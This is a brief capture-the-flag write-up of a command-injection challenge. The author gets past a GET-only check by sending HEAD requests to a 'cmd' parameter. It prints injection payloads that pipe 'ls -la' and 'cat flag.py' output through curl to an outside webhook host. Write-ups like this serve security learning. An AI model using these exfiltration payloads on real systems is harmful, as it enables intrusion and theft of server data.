## Description
<img width="579" height="657" alt="image" src="https://github.com/user-attachments/assets/ba7b8cfb-bd0d-4d9a-bfb4-dcc22cc26bc3" />

There are only GET method, but requesting GET method can't use os.system()

## Vulnerability
Command Injection  
cmd, user's input is directly used for command

## Exploit
<img width="539" height="324" alt="image" src="https://github.com/user-attachments/assets/0aaf53c4-f17c-4060-b3d2-b8713b4d6f95" />

First of all, we send request for POST.  
We can check Allow methods, HEAD, OPTIONS  
So we should use HEAD method that is similar to GET method, but they only show head part.  

<img width="1201" height="199" alt="image" src="https://github.com/user-attachments/assets/319ef4a5-4872-4036-a896-fe8cf5894546" />
And we should use another server for receiving command result, because server just return cmd string.  

/?cmd=ls -la | curl -X POST -d @- [address]  -> we should encode for URL because URL is not supporting space.  
and I used webhook.site

<img width="1194" height="197" alt="image" src="https://github.com/user-attachments/assets/728ee74a-27e6-4adf-a538-855b9cce70ba" />
And we can find out that flag.py is on the current location, so we should print out that.  

/?cmd=cat flag.py | curl -X POST -d @- [address]  
And then we can get a flag for this problem.  
